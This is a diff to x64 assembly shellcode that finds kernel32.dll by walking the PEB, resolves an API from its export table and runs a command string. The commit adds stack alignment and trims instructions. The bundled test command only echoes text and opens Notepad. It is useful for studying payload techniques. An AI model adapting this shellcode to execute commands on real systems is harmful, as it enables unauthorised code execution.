@@ -21,6 +21,8 @@
  ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR 
  ;  OTHER DEALINGS IN THE SOFTWARE.
  ;
+ ;  Size: 98 bytes
+ ;
     .x64
     ifndef TEST_CODE
       .model flat, fastcall
@@ -32,16 +34,17 @@ entrypoint:
     push   rdi
     push   rbp
     
+    mov    r15, rsp
+    and    rsp, -16
     sub    rsp, 28h
     jmp    init_cmd
 calc_pos:
-    xor    eax, eax
     push   60h
     pop    rcx
     mov    rsi, [gs:rcx]
     mov    esi, [rsi+18h]
     mov    esi, [rsi+10h]               ; InLoadOrderModuleList
-    lodsd                              ; skip ntdll.dll
+    lodsd                               ; skip ntdll.dll
     mov    esi, [rax]                   ; kernel32.dll
     mov    edi, [rsi+30h]               ; LDR_DATA_TABLE_ENTRY.DllBase    
     add    ecx, dword ptr[rdi+3ch]
@@ -62,11 +65,11 @@ find_loop:
 
     mov    esi, dword ptr[rdi+rbx+1ch]
     add    esi, edi
-    add    edi, [rsi+4*rbp]    
+    add    edi, [rsi+4*rbp]
     cdq    
     pop    rcx
     call   rdi
-    add    rsp, 28h
+    mov    rsp, r15
     
     pop    rbp
     pop    rdi
@@ -80,4 +83,3 @@ ifdef TEST_CODE
     db 'cmd /c echo Hello, World! >test.txt && notepad test.txt', 00h
 endif
     end entrypoint
-    
